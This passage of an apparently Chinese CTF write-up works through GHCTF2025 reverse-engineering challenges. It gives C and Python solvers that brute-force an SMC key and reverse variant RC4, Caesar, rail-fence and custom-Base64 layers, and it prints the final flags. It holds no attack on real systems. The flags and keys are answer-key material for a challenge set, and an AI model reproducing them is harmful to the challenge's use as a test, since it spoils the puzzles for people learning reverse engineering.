text"></p><p>但是经过实际检验，如果直接从0x0-0xffffffff爆破会出现非常多的符合值，无法确定哪个是真实密钥，就必须得缩小范围，这时会想到这个SMC加密函数存在特性，因为通过的是异或加密，所以可以根据原始字节与当前字节异或得到中间密钥。</p><p>跳到enc段开头，复制开头三个字节，然后随便找一个函数也复制开头三个字节，将两对数据进行异或，就会得到密钥的前三个字节。</p><p><img src="/2025/03/06/GHCTF2025WP/43.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/44.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/45.png" alt="alt text"></p><p>这下范围缩小至0x755ff000-0x755ff0ff之间，使用代码爆破即可得到密钥。</p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_4011C0</span><span class="params">(<span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// int v2&#123;&#125;;          // [esp+0h] [ebp-1Ch]</span></span><br><span class="line">    <span class="type">int</span> i&#123;&#125;;           <span class="comment">// [esp+4h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v4&#123;&#125;;          <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v5&#123;&#125;;          <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> v6&#123;&#125;;          <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">int</span> v7&#123;&#125;;          <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8&#123;&#125;; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">    <span class="type">int</span> v9&#123;&#125;;          <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// v2 = sub_401100(Str);</span></span><br><span class="line">    <span class="comment">// if (!v2)</span></span><br><span class="line">    <span class="comment">// return 0;</span></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v9 = v2;</span><br><span class="line">    v8 = (v2 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    v5 = (v2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    v4 = (v2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = v6 * (v8 + <span class="number">1415881080</span>) * (v9 - <span class="number">1467486175</span>) * ((v8 - v9) ^ (v8 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">        v5 = (v9 + v5) ^ (<span class="number">8</span> * v4);</span><br><span class="line">        v4 = (v9 + v8) ^ (<span class="number">8</span> * v5);</span><br><span class="line">        v8 = (v9 + v4) ^ (<span class="number">8</span> * v5);</span><br><span class="line">        v9 -= v4 + v5 + v8;</span><br><span class="line">        <span class="comment">// 若于1415881080相等，则会触发除0异常</span></span><br><span class="line">        <span class="keyword">if</span> (v9 == <span class="number">1415881080</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Key:%X\n&quot;</span>, v2);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = v7 + (v8 + <span class="number">1467486175</span>) * (((v8 - v9) ^ (<span class="type">unsigned</span> __int64)(v8 &gt;&gt; <span class="number">4</span>)) / (<span class="type">unsigned</span> <span class="type">int</span>)(v9 - <span class="number">1415881080</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v9 ^ v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x755ff000</span>; i &lt; <span class="number">0x755ff0ff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sub_4011C0</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到密钥<code>755FF0D3</code></p><p>还原main函数nop的三行汇编，重新ida载入程序分析也可以，在异常except处断点，然后运行输入密钥，发现确实途中会触发div 0异常，然后断点会触发，</p><p><img src="/2025/03/06/GHCTF2025WP/46.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/47.png" alt="alt text"></p><p>单步执行完SMC函数解密函数，然后跳到enc段的函数进行按c还原代码。</p><p><img src="/2025/03/06/GHCTF2025WP/48.png" alt="alt text"></p><p>还原途中会发现几个花指令，和之前遇到的一样类型的，同样去除就好，最后选中函数按p识别为函数进行反编译即可。</p><p><img src="/2025/03/06/GHCTF2025WP/49.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/50.png" alt="alt text"></p><p>会发现是一个变种RC4，发现v18是RC4密钥，且最后加密完的值又与v18字节数组进行异或。</p><p><img src="/2025/03/06/GHCTF2025WP/51.png" alt="alt text"></p><p>v18不知道是什么数据，直接让代码执行到第一个for执行完处，就可以看到v18值，这8个字节就是密钥，编写代码将byte_405020字节数组进行解密即可得到密钥。</p><p><img src="/2025/03/06/GHCTF2025WP/52.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/53.png" alt="alt text"></p><p>附：v18是从a2数据转换得来，a2数据实际是触发异常的时候通过栈进行获取异常前数据，实际数据是触发异常时候的v6值，传过来到enc段函数当作密钥进行加密。</p><p><img src="/2025/03/06/GHCTF2025WP/54.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/55.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a, <span class="type">unsigned</span> <span class="type">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> keyLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Ttable[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        Ttable[i] = key[i % keyLen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + sbox[i] + Ttable[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> data[], <span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k, i = <span class="number">0</span>, j = <span class="number">0</span>, t;</span><br><span class="line">    <span class="built_in">init_sbox</span>(key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dataLen = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> h = <span class="number">0</span>; h &lt; dataLen; h++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + sbox[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">        t = (sbox[i] + sbox[j]) % <span class="number">256</span>;</span><br><span class="line">        k = sbox[t];</span><br><span class="line">        data[h] ^= k ^ key[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 两个数组最后的0x00都当作截止符，让strlen调用的时候正常返回长度。</span></span><br><span class="line">    <span class="type">uint8_t</span> enc[]&#123;<span class="number">0x22</span>, <span class="number">0xC4</span>, <span class="number">0xA0</span>, <span class="number">0x5A</span>, <span class="number">0xDE</span>, <span class="number">0xED</span>, <span class="number">0x62</span>, <span class="number">0x5E</span>, <span class="number">0x25</span>, <span class="number">0xE2</span>, <span class="number">0x6D</span>, <span class="number">0xA6</span>, <span class="number">0x05</span>, <span class="number">0xA7</span>, <span class="number">0x20</span>, <span class="number">0x8D</span>, <span class="number">0x7D</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0x3E</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0x7F</span>, <span class="number">0xFA</span>, <span class="number">0x09</span>, <span class="number">0xD8</span>, <span class="number">0x62</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xC2</span>, <span class="number">0xA9</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> key[]&#123;<span class="number">0xD4</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0xF8</span>, <span class="number">0xF8</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="built_in">RC4</span>(enc, key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-5"><a href="#Flag值-5" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Int3r3st1ng_5MC_Pr0gr@m?&#125;</code></p><h2 id="Canon"><a href="#Canon" class="headerlink" title="Canon"></a>Canon</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>IDA分析main函数，发现是将输入的字符串分成3份，在循环里面互为密钥进行循环加密，并且利用a3数组数据传入调用不同的加密。</p><p>可以看到加密函数里面有多个case，但由于a3数组里面数字是有限的，只出现了13456，2和7加密没有用到，所以不用分析那两个case。</p><p><img src="/2025/03/06/GHCTF2025WP/84.png" alt="alt text"></p><p>case1：凯撒加密</p><p><img src="/2025/03/06/GHCTF2025WP/85.png" alt="alt text"></p><p>case3：栅栏加密</p><p><img src="/2025/03/06/GHCTF2025WP/86.png" alt="alt text"></p><p>case4：字符串位移</p><p><img src="/2025/03/06/GHCTF2025WP/87.png" alt="alt text"></p><p>case5：异或加密 + Base64</p><p><img src="/2025/03/06/GHCTF2025WP/88.png" alt="alt text"></p><p>case6：变种RC4 + Base64</p><p><img src="/2025/03/06/GHCTF2025WP/89.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/90.png" alt="alt text"></p><p>注意，Base64的表是被换过的，可以查找交叉调用发现，可以直接动调获取到换后的表。</p><p><img src="/2025/03/06/GHCTF2025WP/91.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/92.png" alt="alt text"></p><p>main函数执行加密的双循环中用到的加密方式数值和加密顺序都可以通过模拟循环来得到，然后逆向就是解密调用的函数顺序和密文顺序。</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    key = key.encode()</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    plaintext = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        plaintext.append(((byte - <span class="number">0x39</span>) ^ k) % <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replay</span>(<span class="params">violin, bass, mode</span>):</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(violin):</span><br><span class="line">            offset = <span class="built_in">ord</span>(bass[i % <span class="built_in">len</span>(bass)])</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - offset) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += violin[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">3</span>:</span><br><span class="line">            Ek = <span class="built_in">ord</span>(bass[<span class="number">0</span>]) % <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">            Dk = <span class="built_in">int</span>(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">            res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            yushu = <span class="built_in">len</span>(violin) % Ek</span><br><span class="line">            steps = []</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(violin) % Ek == <span class="number">0</span>:</span><br><span class="line">                step = Dk</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Ek):</span><br><span class="line">                    steps.append(step)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                big_step = math.ceil(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">                small_step = <span class="built_in">int</span>(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(yushu):</span><br><span class="line">                    steps.append(big_step)</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(Ek - yushu):</span><br><span class="line">                    steps.append(small_step)</span><br><span class="line"></span><br><span class="line">            n_column = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> n_column &lt; math.ceil(<span class="built_in">len</span>(violin) / Ek):</span><br><span class="line">                count_steps = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> one_step <span class="keyword">in</span> steps:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="built_in">len</span>(violin):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        res += violin[n_column + count_steps]</span><br><span class="line">                        count_steps += one_step</span><br><span class="line">                n_column += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">4</span>:</span><br><span class="line">        step = <span class="built_in">ord</span>(bass[<span class="number">0</span>]) % <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        res += violin[step:]</span><br><span class="line">        res += violin[:step]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">5</span>:</span><br><span class="line">        violin_decode = base64.b64decode(violin.translate(<span class="built_in">str</span>.maketrans(new_table, old_table)))</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(violin_decode):</span><br><span class="line">            res += <span class="built_in">chr</span>(char ^ <span class="built_in">ord</span>(bass[i % <span class="built_in">len</span>(bass)]) + <span class="number">0x39</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">6</span>:</span><br><span class="line">        violin_byte = base64.b64decode(violin.translate(<span class="built_in">str</span>.maketrans(new_table, old_table)))</span><br><span class="line">        res = rc4_decrypt(violin_byte, bass)</span><br><span class="line">        <span class="keyword">return</span> res.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    violin = [<span class="string">&quot;WgvDmssEvcY326bHo3nNro3vXvvfmgrz&quot;</span>, <span class="string">&quot;gX+Ri9PG=bt5=00B6hscPQOL&quot;</span>, <span class="string">&quot;T6bHgUPL2gXUd=xT=FNHtPzV&quot;</span>]</span><br><span class="line">    v = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">    chord = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        tmp = replay(violin[v[i] - <span class="number">1</span>], violin[v[i] % <span class="number">3</span>], chord[i])</span><br><span class="line">        violin[v[i] - <span class="number">1</span>] = tmp</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(violin))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Flag值-6"><a href="#Flag值-6" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;P4ch3Lbel&#39;s_C@n0n_1n_D_mAjOr&#125;</code></p><h2 id="腐蚀"><a href="#腐蚀" class="headerlink" title="腐蚀"></a>腐蚀</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>IDA分析main函数，发现开头程序要读入一个Input.png文件。</p><p><img src="/2025/03/06/GHCTF2025WP/56.png" alt="alt text"></p><p>并且在程序尾部将加密后的数据写到enc文件，输出完成语句。</p><p><img src="/2025/03/06/GHCTF2025WP/57.png" alt="alt text"></p><p>进入这个函数。</p><p><img src="/2025/03/06/GHCTF2025WP/58.png" alt="alt text"></p><p>发现这个函数是一个RC4加密流程，通过0x100特征和一些异或计算可以看出来的。</p><p>并且是变种RC4，最后异或加密的时候多异或上了0x1f。</p><p><img src="/2025/03/06/GHCTF2025WP/59.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/60.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/61.png" alt="alt text"></p><p>我们创建一个Input.png文件，动调程序运行到这个函数断住，a2可以在第二个while循环中看出来，是充当RC4密钥。</p><p>跳到a2地址，发现是一个这样的结构，数据长度+数据指针，数据指针跳过去，这十六个字节就是密钥，发现一些特征，看起来像是PNG文件的开头部分字节和结尾部分字节乱序混在一起，不过不重要，只要动调拿到16字节的key即可。<br>密钥：<code>60 82 AE 42 4E 44 49 45 1A 0A 0D 0A 4E 47 89 50</code></p><p><img src="/2025/03/06/GHCTF2025WP/62.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/63.png" alt="alt text"></p><p>而a3是即将被加密的明文数据，跳过去发现也是同样结构，发现大小是0x30B，和我给的Input.png文件字节数一样，跳过去就会发现就是读入的png文件字节。</p><p><img src="/2025/03/06/GHCTF2025WP/64.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/65.png" alt="alt text"></p><p>从函数尾部的赋值可以看出a1就是加密后数据储存的地方，将该函数执行完返回到main函数，然后跳到a1地址将数据复制出来尝试RC4+Xor解密，发现确实可以解密出原字节，</p><p><img src="/2025/03/06/GHCTF2025WP/66.png" alt="alt text"></p><p>直接执行到write_all即将写出到enc文件处，然后查看v18，v18是通过上面RC4加密返回的v44得到的。</p><p><img src="/2025/03/06/GHCTF2025WP/67.png" alt="alt text"></p><p>发现对比原RC4加密返回的数据，写出的数据做了字节顺序翻转处理。</p><p><img src="/2025/03/06/GHCTF2025WP/68.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/69.png" alt="alt text"></p><p>直接让程序跑起来，写出enc文件，拖入到010Editor中，发现确实是将RC4加密后的数据翻转后再写到的文件。</p><p><img src="/2025/03/06/GHCTF2025WP/70.png" alt="alt text"></p><p>所以解密流程为：读入题目enc附件-&gt;翻转字节-&gt;RC4解密</p><p>Cyberchef：</p><p><img src="/2025/03/06/GHCTF2025WP/71.png" alt="alt text"></p><p>导出图片得到Flag</p><p><img src="/2025/03/06/GHCTF2025WP/72.png" alt="alt text"></p><h3 id="Flag值-7"><a href="#Flag值-7" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Y0u_ar3_ru5t_m@st3r&#125;</code></p><h2 id="ezObfus"><a href="#ezObfus" class="headerlink" title="ezObfus"></a>ezObfus</h2><h3 id="分析-8"><a href="#分析-8" 